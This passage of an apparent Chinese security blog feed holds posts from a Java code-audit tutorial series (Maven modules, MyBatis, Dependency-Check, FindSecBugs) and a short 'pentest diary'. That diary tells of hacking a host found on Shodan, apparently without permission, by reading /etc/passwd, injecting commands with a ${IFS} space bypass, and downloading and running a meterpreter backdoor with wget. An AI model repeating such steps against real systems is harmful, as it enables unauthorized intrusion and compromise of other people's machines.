处，描述了这个项目的开发组织，项目名称，项目版本。</p><p>② 处，用的是<code>modules</code>标签，说明这是一个多模块项目。在左边的导航栏，可以看到确实有许多子模块。</p><blockquote><p>多模块项目是为了在项目开发中便于后期维护，所以采用分层开发的方法，这样各个模块的职责会比较的明确，维护起来相对容易。在打包时，只要对父模块打包即可，子模块会自动合并进来。</p></blockquote><p>③ 处，是 maven 在构建时相关的配置，这里用了一个 compiler 插件，表示源码用的是<code>1.7</code>的<code>JDK</code>并且生成的目标字节码文件也要是<code>1.7</code>的。</p><h3 id="子模块下的-pom-xml"><a href="#子模块下的-pom-xml" class="headerlink" title="子模块下的 pom.xml"></a>子模块下的 pom.xml</h3><p>点开每个子模块，看到每个模块下还会有一个<code>pom.xml</code>。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/maven2.png" alt="maven2"></p><p>随便点一个<code>pom.xml</code>，它和根目录下的<code>pom.xml</code>有所不同，多了一个<code>&lt;parent&gt;</code>标签，和<code>dependencies</code>。</p><p><code>&lt;parent&gt;</code>标签，表示这个子模块，将上级的<code>jeesns</code>项目作父模块。</p><p><code>dependencies</code>，描述了这个模块的依赖关系。当前的<code>web</code>模块依赖于子模块<code>core</code>,<code>model</code>,<code>service</code>,<code>common</code>。而子模块<code>core</code>里，依赖于许多的第三方库，包括<code>Spring</code>、<code>MyBatis</code>、<code>apache-commons</code>等。它们都继承了上级的<code>jeesns</code>父模块，在逻辑上同属一个项目。</p><blockquote><p>相关文章 <a href="https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html" target="_blank" rel="noopener">https://www.cnblogs.com/davenkin/p/advanced-maven-multi-module-vs-inheritance.html</a></p></blockquote><h2 id="第三方库的安全检查"><a href="#第三方库的安全检查" class="headerlink" title="第三方库的安全检查"></a>第三方库的安全检查</h2><p>前面有说过，<code>pom.xml</code>有个重要的作用是管理依赖关系。在<code>&lt;dependencies&gt;</code>中填写要引入的第三方库信息，<code>Maven</code>在<code>import</code>时，会从<code>仓库</code>下载相关的库文件，加入到当前项目。</p><p>我们需要<code>&lt;dependencies&gt;</code>中，检查使用的第三方库是否有已知的安全漏洞。<br>这里只要根据组件名称、版本号，去官网或者<code>CVE</code>漏洞库搜下就行了。如果项目很大，引入了太多库，这也是件很累的事情。</p><p>所以 OWASP 出了一个工具 <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a> 专门检查这类问题，这个工具的使用在前面一篇已经讲过了，就不多介绍了。</p><h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><p><code>JEESNS</code> 一共分了六个子模块，分别是 <code>jeesns-common</code>、<code>jeesns-core</code>、<code>jeesns-dao</code>、<code>jeesns-model</code>、<code>jeesns-service</code>、<code>jeesns-web</code>。</p><p>接下来，我们来分析各个子模块的作用。</p><h3 id="jeesns-core"><a href="#jeesns-core" class="headerlink" title="jeesns-core"></a>jeesns-core</h3><p>看名字就知道，这是这套 Web 程序的核心部分。</p><p>通过分析 <code>pom.xml</code> 文件，发现它引入了以下第三方库：</p><table><thead><tr><th>库名</th><th>用途</th></tr></thead><tbody><tr><td>spring-*</td><td>spring 框架相关</td></tr><tr><td>freemarker</td><td>前端模板引擎</td></tr><tr><td>httpclient</td><td>http 客户端</td></tr><tr><td>mysql-connector</td><td>mysql 连接器驱动</td></tr><tr><td>c3p0</td><td>数据库连接池</td></tr><tr><td>mybatis</td><td>半自动 ORM 框架</td></tr><tr><td>hibernate-validator</td><td>数据有效性验证</td></tr><tr><td>jackson</td><td>json 数据处理库</td></tr><tr><td>jsoup</td><td>html 解析器</td></tr><tr><td>log4j</td><td>日志管理框架</td></tr><tr><td>commons-io</td><td>io 工具类</td></tr><tr><td>commons-codec</td><td>编码处理工具类</td></tr><tr><td>commons-lang</td><td>Java 基本对象工具类</td></tr><tr><td>commons-fileupload</td><td>提供文件上传功能</td></tr><tr><td>commons-logging</td><td>提供 Java 日志接口</td></tr></tbody></table><p>根据上表，即使我们不看官方的介绍，也基本可以确定这套程序的技术栈。</p><p>主要使用了 <code>SSM框架</code> (Spring+SpringMVC+MyBatis)， <code>freemarker</code> 模板引擎，支持 <code>MySQL</code> 数据库，使用 <code>c3p0</code> 连接池，<code>jackson</code> 处理 <code>json</code> 数据，<code>hibernate-validator</code> 对用户传来的请求数据进行有效性验证，还有一些 <code>apache</code> 提供的工具类。</p><h4 id="包结构"><a href="#包结构" class="headerlink" title="包结构"></a>包结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- core</span><br><span class="line"></span><br><span class="line">  - annotation 定义注解</span><br><span class="line"></span><br><span class="line">  - consts 定义常量</span><br><span class="line"></span><br><span class="line">  - directive 定义了一个抽象类 `BaseDirective` ，所有的标签类都会继承它</span><br><span class="line"></span><br><span class="line">  - dto 定义`响应结果`的数据传输模型</span><br><span class="line"></span><br><span class="line">  - enums 定义功能相关的常量</span><br><span class="line"></span><br><span class="line">  - exception 定义异常</span><br><span class="line"></span><br><span class="line">  - filter 定义过滤器，目前只有一个`XSS`过滤器</span><br><span class="line"></span><br><span class="line">  - handler 定义处理器，目前只有`DirectiveHandler`，负责处理每个页面的渲染</span><br><span class="line"></span><br><span class="line">  - model 定义了数据模型，这里只有`Page`，描述页面对象，用于数据分页情况</span><br><span class="line"></span><br><span class="line">  - utils 定义工具类</span><br><span class="line"></span><br><span class="line">+ interceptor</span><br><span class="line"></span><br><span class="line">  - PageInterceptor 分页拦截器，处理需要分页的请求。</span><br></pre></td></tr></table></figure><h4 id="模块小结"><a href="#模块小结" class="headerlink" title="模块小结"></a>模块小结</h4><p>通过分析 <code>jeesns-core</code> 的模块，我们已经知道了 <code>jeesns</code> 的技术栈，是目前比较流行的 <code>SSM</code> 框架，这个核心模块给整个项目构建了一个基本骨架，包括功能方面的还有我们关心的安全方面的（虽然只有 <code>XSS</code> 防御 <code>($ _ $)</code> ）。</p><p>在分析下面模块之前，我们需要先了解 <code>SSM</code> 的一些概念。<a href="https://www.cnblogs.com/zyw-205520/p/4771253.html" target="_blank" rel="noopener">参考文章</a></p><p>当然，最重要的还是要知道什么是 <code>MVC</code>，因为大部分的 <code>Web</code> 项目，都是基于这种<code>设计模式</code>开发的，包括 <code>JEESNS</code> 。<a href="https://blog.csdn.net/qq_26411021/article/details/79493340" target="_blank" rel="noopener">参考文章</a></p><blockquote><p>设计模式与编程语言无关，可以说是一套经验科学，由前人总结、分类，被广泛使用。目的是为了代码可重用性、让代码更容易被他人理解、保证代码可靠性。</p></blockquote><blockquote><blockquote><p><code>Java</code> 设计模式学习链接：<a href="https://github.com/AlfredTheBest/Design-Pattern" target="_blank" rel="noopener">https://github.com/AlfredTheBest/Design-Pattern</a></p></blockquote></blockquote><p>如果，你已经了解了<code>SSM</code>、<code>MVC</code>的概念，那就接着往下看吧 <code>O(∩_∩)O</code> 。</p><h3 id="jeesns-web"><a href="#jeesns-web" class="headerlink" title="jeesns-web"></a>jeesns-web</h3><p>对应 <code>MVC</code> 中的 <code>Controller</code> 层，负责具体业务的模块流程的控制，会调用到下面 <code>Service</code> 层的接口来控制业务流程。</p><p><code>webapp</code> 里是 <code>View</code> 层用到的静态资源（js、css、jpg）以及<code>freemarker</code>的模板文件。</p><p><code>resources</code> 里，有项目相关的各种配置文件。</p><h4 id="模块小结-1"><a href="#模块小结-1" class="headerlink" title="模块小结"></a>模块小结</h4><p><code>Controller</code> 层和 <code>View</code> 层结合的最紧密，两者通常协同开发。</p><p>这里的 <code>Controller</code> 层还设置了<code>监听器</code>，负责对用户的身份和权限进行认证管理。</p><blockquote><p>通常在 Java Web 里，我们会用 <code>Spring-Security</code> 或 <code>Shiro</code> 这些第三方库来帮助我们实现<strong>用户认证和用户授权</strong>的功能 。</p></blockquote><h3 id="jeesns-service"><a href="#jeesns-service" class="headerlink" title="jeesns-service"></a>jeesns-service</h3><p><code>Service</code> 层，主要负责业务模块的应用逻辑应用设计，先设计接口，在设计实现类。这一层，是纯业务逻辑。在使用 <code>Service</code> 层时，会继续调用下面的 <code>DAO</code> 层的接口。</p><h3 id="jeesns-dao"><a href="#jeesns-dao" class="headerlink" title="jeesns-dao"></a>jeesns-dao</h3><p><code>DAO</code> 层，负责数据持久化，通俗点说就是用来和数据库交互，读写数据的模块。</p><p>前面有说到，<code>JEESNS</code> 用了 <code>MyBatis</code> 作为数据持久化框架。<code>MyBatis</code> 属于半自动 <code>ORM</code> ，它会帮我们自动将数据查询结果映射到对象，但是数据查询的 <code>SQL</code> 语句还是要我们自己手写，这点和其它的 <code>ORM</code> 明显的不一样。</p><p><code>MyBatis</code> 的使用方式主要有两种，一种是使用<code>注解</code>，直接将<code>SQL</code>语句和<code>方法</code>绑定在一起，像下面这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mybatis.example;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Select</span>(<span class="string">"SELECT * FROM blog WHERE id = #&#123;id&#125;"</span>)</span><br><span class="line">  <span class="function">Blog <span class="title">selectBlog</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方式，适合简单的<code>SQL</code>语句，一旦语句长了，注释会变得复杂混乱，维护起来很麻烦，所以它只适合小项目（小项目用的也不多）。</p><p>用的最多的是第二种——<code>XML</code>配置，将<code>SQL</code>语句和<code>Java</code>代码分离，有独立的<code>xml</code>文件，描述某个方法会和某个<code>SQL</code>语句绑定。</p><p><img src="/2018/10/29/java-audit-step-by-step-2/mybatis1.png" alt="mybatis1"></p><p>如图，每一个接口，在资源文件目录中，都有对应的<code>xml</code>。接口中的方法，和<code>xml</code>中<code>id</code>相同的<code>SQL</code>语句关联。</p><p>例如，<code>IArticleCateDao</code> 的 <code>list()</code>方法被调用，那么就会找到 <code>ArticleCateMapper.xml</code>中 <code>id</code>等于 <code>list</code> 的方法，执行它的 <code>SQL</code>，然后根据 <code>resultMap</code> 描述的 <em>字段-属性</em> 映射关系，返回相应的实例对象。</p><p>这里的 <code>resultMap</code> 具体如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"ArticleCateResult"</span> <span class="attr">type</span>=<span class="string">"ArticleCate"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"fid"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"fid"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"name"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"status"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"status"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"sort"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"sort"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>id</code>属性是该映射的名称，<code>type</code>属性代表映射的类。里面有 <code>5</code> 个子元素，<code>id</code>元素映射到<code>ArticleCate</code>的<code>id</code>属性。其它四个<code>result</code>元素中的<code>column</code>属性会映射到对应的<code>property</code>属性。</p><h4 id="模块小结-2"><a href="#模块小结-2" class="headerlink" title="模块小结"></a>模块小结</h4><p><code>dao</code> 模块负责数据的持久化，会和数据库交互。开发者编写的<code>SQL</code>语句也定义在这个模块，<code>MyBatis</code>有特殊的语法将查询的参数代入到<code>SQL</code>语句中，如果开发者在这里使用的语法有问题，就有极有可能出现 <code>SQL注入</code>。</p><h3 id="jeesns-model"><a href="#jeesns-model" class="headerlink" title="jeesns-model"></a>jeesns-model</h3><p>定义了所有和功能业务相关的数据模型，和数据库表对应。</p><h3 id="jeesns-common"><a href="#jeesns-common" class="headerlink" title="jeesns-common"></a>jeesns-common</h3><p>定义了其它模块会用到的常量以及工具类。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇主要以 <code>JEESNS</code> 为例，介绍了目前比较流行的 <code>Java Web</code> 项目的结构。</p><p>理清项目结构后，我们就可以继续下一步——漏洞挖掘啦。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。&lt;/p&gt;
&lt;p&gt;本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://jayl1n.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从1开始的Java代码审计·第一弹·基础篇（上）</title>
    <link href="https://jayl1n.github.io/2018/10/25/java-audit-step-by-step-1/"/>
    <id>https://jayl1n.github.io/2018/10/25/java-audit-step-by-step-1/</id>
    <published>2018-10-24T17:59:39.000Z</published>
    <updated>2019-08-19T14:29:15.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p><a id="more"></a><p><img src="/2018/10/25/java-audit-step-by-step-1/jdk_ctl.png" alt="jdk-ctl"></p><h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><p>做任何一门语言的代码审计，一个强大的IDE是必不可少的，好的IDE可以极大提高我们审计的效率。写Java的程序及代码审计，我推荐使用JetBrains家的<a href="https://www.jetbrains.com/idea/" target="_blank" rel="noopener"><code>Intelij IDEA</code></a>（JB大法好 O(∩_∩)O ），内置的代码检查工具比Eclipse强太多了，而且有很多的插件支持。</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>常见的数据库有 MySQL、PostgreSQL、Oracle，除此之外还有现在比较流行的非关系型数据库 Redis、Mongodb、Memcached 等等，有些数据库安装起来可能比较麻烦，不用一次性装完，有需要的时候再去装就行了。</p><h2 id="Web-容器"><a href="#Web-容器" class="headerlink" title="Web 容器"></a>Web 容器</h2><p><code>Java Web</code>应用在开发完后，通常会以<code>war</code>包的形式发布，我们需要把这个<code>war</code>包部署到自己的<code>Web容器</code>（也可以说是Web服务器）里去，容器在启动后会自动解压<code>war</code>包，处理用户发来的HTTP请求，将<code>jsp</code>编译成<code>servlet</code>，管理<code>servlet</code>的整个生命周期。</p><p>常见的 Web 容器有 Tomcat，JBoss，Jetty，Weblogic，不同的容器在功能、性能上有所差异，但仅仅是做代码审计用<a href="http://tomcat.apache.org/" target="_blank" rel="noopener"><code>Tomcat</code></a>就足够了。</p><hr><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><h2 id="依赖检查"><a href="#依赖检查" class="headerlink" title="依赖检查"></a>依赖检查</h2><p>一个完整的Java项目，必然会引入一些外部的第三方库。这些库如果出了安全漏洞，会给应用带来巨大的风险。比如经常爆洞的<code>struts2</code>，以及最近几年很火的Java反序列化漏洞相关的<code>fastjson</code>,<code>jackson</code>,<code>apache-commons-collections</code>等等。如果开发者在开发的时候，没有对引入的库做安全检查，或者是直接从代码库里拉出来的依赖配置，那么很可能会引入过时了很久的库版本，带来安全隐患。在 OWASP TOP10 中有讲到这一类型的安全风险。</p><blockquote><p>参考 <a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities" target="_blank" rel="noopener"><code>OWASP TOP10 A9</code></a></p></blockquote><p>推荐一个工具，OWASP 出的 <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check" target="_blank" rel="noopener"><code>Dependency_Check</code></a>，可以自动帮我们检查，引入的第三方库是否有已知的安全漏洞。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="插件模式"><a href="#插件模式" class="headerlink" title="插件模式"></a>插件模式</h4><p>作为 maven 的插件使用，用法很简单，直接在项目的 <code>pom.xml</code> 写入</p><pre><code><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>然后，执行 `mvn verify` 就可以了。</code></pre><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><p>我更喜欢以独立的命令行模式来运行，这样就不用进IDE额外修改 <code>pom.xml</code> 配置了。</p><ol><li><p>进入项目的github，<a href="https://github.com/jeremylong/DependencyCheck/releases" target="_blank" rel="noopener"><code>DependencyCheck</code></a>，找到最新的那版，下载下来。</p></li><li><p>解压出来，进到bin目录，有两个文件，分别对应windows版和linux版。</p></li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/bin_directory.png" alt="bin目录"></p><ol start="3"><li>进到命令行下，执行 <code>dependency-check.bat --project 项目名 --out 输出名 -s 源码路径</code> 即可，程序会自动从NVD更新漏洞库，所以需要点时间（应该还要翻墙）。</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_dc.png" alt="执行过程"></p><ol start="4"><li>扫描完毕后，会输出一份报告，如下：</li></ol><p><img src="/2018/10/25/java-audit-step-by-step-1/result_dc.png" alt="扫描结果"></p><h2 id="FindSecBugs"><a href="#FindSecBugs" class="headerlink" title="FindSecBugs"></a>FindSecBugs</h2><p><a href="https://find-sec-bugs.github.io" target="_blank" rel="noopener">FindSecBugs</a> 是专门用于检测Java Web应用安全漏洞的插件，支持多种IDE，还可以和SonarQube等代码分析平台集成。</p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>安装方法官网讲的很详细了，<a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial" target="_blank" rel="noopener">IDEA中安装FindSecBugs</a>。</p><p>这里主要讲IDEA中如何使用<code>FindSecBugs</code>。</p><p>IDEA打开要审计的项目以后，先点开 FindBugs-IDEA 标签，然后点左边的这个带绿色旗帜的文件夹logo，插件就会自动对项目进行审计。</p><p><img src="/2018/10/25/java-audit-step-by-step-1/exec_fsb.png" alt="开始扫描"></p><p><img src="/2018/10/25/java-audit-step-by-step-1/result_fsb.png" alt="扫描结果"></p><p>看这个项目的扫描结果，发现了 5 处安全bug，其中四处是文件的操作可能被用户控制，造成任意文件删除。当然，这也可能是误报，需要人工来再次确认。不过，这已经给我们的审计工作带来了很大的便利了（。＾▽＾）。</p><h2 id="抓包改包"><a href="#抓包改包" class="headerlink" title="抓包改包"></a>抓包改包</h2><p>做Java Web审计时，可能要结合黑盒的方法，动态调试。这时候就需要抓包改包的工具，发送自定义的HTTP包。这个功能很多工具都有，burpsuite，zap，postman，fiddler都可以用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本环境&quot;&gt;&lt;a href=&quot;#基本环境&quot; class=&quot;headerlink&quot; title=&quot;基本环境&quot;&gt;&lt;/a&gt;基本环境&lt;/h1&gt;&lt;h2 id=&quot;JDK&quot;&gt;&lt;a href=&quot;#JDK&quot; class=&quot;headerlink&quot; title=&quot;JDK&quot;&gt;&lt;/a&gt;JDK&lt;/h2&gt;&lt;p&gt;目前，&lt;code&gt;JDK&lt;/code&gt;已经出到&lt;code&gt;11&lt;/code&gt;了，&lt;code&gt;JDK&lt;/code&gt;每个版本都会有些新特性出来。很多情况下&lt;code&gt;JDK&lt;/code&gt;并不向下兼容，导致一些软件在较新的&lt;code&gt;JDK&lt;/code&gt;中无法正常运行，所以推荐用现在比较主流的&lt;code&gt;JDK8&lt;/code&gt;。而且有些漏洞需要在低版本的&lt;code&gt;JDK&lt;/code&gt;上才能复现出来，比如反序列化用到的&lt;code&gt;JNDI Bean Property&lt;/code&gt;类型的&lt;code&gt;Gadget&lt;/code&gt;，需要在小于&lt;code&gt;JDK8_113&lt;/code&gt;的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://jayl1n.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>从1开始的Java代码审计·序</title>
    <link href="https://jayl1n.github.io/2018/10/25/java-audit-step-by-step-0/"/>
    <id>https://jayl1n.github.io/2018/10/25/java-audit-step-by-step-0/</id>
    <published>2018-10-24T17:00:52.000Z</published>
    <updated>2019-08-19T14:29:15.822Z</updated>
    
    <content type="html"><![CDATA[<p>小组经常有小伙伴问我<code>Java</code>该怎么审计，其实我也挺头大的。因为我觉得审<code>Java</code>的代码和审<code>PHP</code>的代码，相差不大。WEB 漏洞就那些，只是换了门语言实现而已，只要漏洞原理知道了，审起来是很容易的。</p><p>很多学安全的同学，应该是从<code>PHP</code>入门的。<code>PHP</code>作为一门脚本语言，跨平台、语法简单、易上手、开源框架多、用户量大。但是，<code>PHP</code>语言本身的特性，它在后期的拓展和维护困难，而且支持所有漏洞（抖个机灵）。很多对系统稳定性、安全性要求较高的厂商不太会去选择<code>PHP</code>，而是<code>Java</code>或者别的语言。</p><p><code>Java</code>是纯正的面向对象的语言，适合团队协作开发，重构、维护相对轻松，语言生态好，且在高性能、高并发、分布式的场景吊打某语言。（虽然<code>PHP</code>也是支持面向对象的写法，不过身边真的在用面向对象的方法写<code>PHP</code>的同学真的很少，可能是不太理解面向对象的概念，也可能是因为写起来代码太长了？）</p><p>目前，网上关于 WEB 代码审计的文章很多都是<code>PHP</code>的，和<code>Java</code>相关的很少，而且质量一般。所以我打算做一个<code>Java</code>代码审计的系列，分享<code>Java</code>代码审计相关的小姿势。</p><p>在这个系列里，我假设每个读者都对 Java 和 WEB 安全方面的知识都有一定的了解，所以可能不会对漏洞的原理做很深的分析。</p><p>如果你觉得看起来有些累，或者对某个漏洞不理解，建议先去找些相关资料学习下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;小组经常有小伙伴问我&lt;code&gt;Java&lt;/code&gt;该怎么审计，其实我也挺头大的。因为我觉得审&lt;code&gt;Java&lt;/code&gt;的代码和审&lt;code&gt;PHP&lt;/code&gt;的代码，相差不大。WEB 漏洞就那些，只是换了门语言实现而已，只要漏洞原理知道了，审起来是很容易的。&lt;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://jayl1n.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>渗透日记-20181005</title>
    <link href="https://jayl1n.github.io/2018/10/05/pentest-20181005/"/>
    <id>https://jayl1n.github.io/2018/10/05/pentest-20181005/</id>
    <published>2018-10-05T05:36:01.000Z</published>
    <updated>2019-08-19T14:29:15.833Z</updated>
    
    <content type="html"><![CDATA[<p>在 shodan 上搜到一个有趣的站，名字就叫 webshell。</p><p><img src="/2018/10/05/pentest-20181005/1.png" alt="1"></p><p>根据提示</p><blockquote><p>Nothing specify params. Try to use “?file=” or “?id=time” to read a stream.</p></blockquote><p>可以通过 file 参数读取文件内容。</p><p>尝试读取 /etc/passwd 成功。</p><a id="more"></a><p><img src="/2018/10/05/pentest-20181005/2.png" alt="2"></p><p>尝试执行命令，<code>a;ls</code>，成功。</p><p><img src="/2018/10/05/pentest-20181005/3.png" alt="3"></p><p>但是但我尝试读取上级目录的时候，<code>a;ls ..</code>，失败。</p><p><img src="/2018/10/05/pentest-20181005/4.png" alt="4"></p><p>尝试了很多方法，最后发现，可能是空格失效了。</p><p>找到 l3m0n 师傅的命令执行绕过技巧，尝试 <code>&lt;&gt;</code> <code>${IFS}</code> 替代空格。</p><p>执行成功。</p><p><img src="/2018/10/05/pentest-20181005/5.png" alt="5"></p><p>接下来，就可以弹一个shell回来，然后为所欲为啦。 （。＾▽＾）</p><p>不过我喜欢用 msf ，那就先在自己服务器的 web 目录写一个 meterpreter 的后门。</p><p>再 wget 下来后运行。</p><p><img src="/2018/10/05/pentest-20181005/6.png" alt="6"></p><p><img src="/2018/10/05/pentest-20181005/7.png" alt="7"></p><p>成功连上。</p><p><img src="/2018/10/05/pentest-20181005/8.png" alt="8"></p><p>Ubuntu 16.04 内核 <code>4.4.0-77</code>，<code>CVE-2017-16995</code> 应该可以直接提权，不过是国内的机器，也没什么太多有意思的东西，就不深入了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 shodan 上搜到一个有趣的站，名字就叫 webshell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/10/05/pentest-20181005/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;根据提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nothing specify params. Try to use “?file=” or “?id=time” to read a stream.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以通过 file 参数读取文件内容。&lt;/p&gt;
&lt;p&gt;尝试读取 /etc/passwd 成功。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pentest" scheme="https://jayl1n.github.io/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>PHP中的命令执行</title>
    <link href="https://jayl1n.github.io/2018/09/18/summary-command-execution/"/>
    <id>https://jayl1n.github.io/2018/09/18/summary-command-execution/</id>
    <published>2018-09-18T11:44:31.000Z</published>
    <updated>2019-08-19T14:29:15.837Z</updated>
    
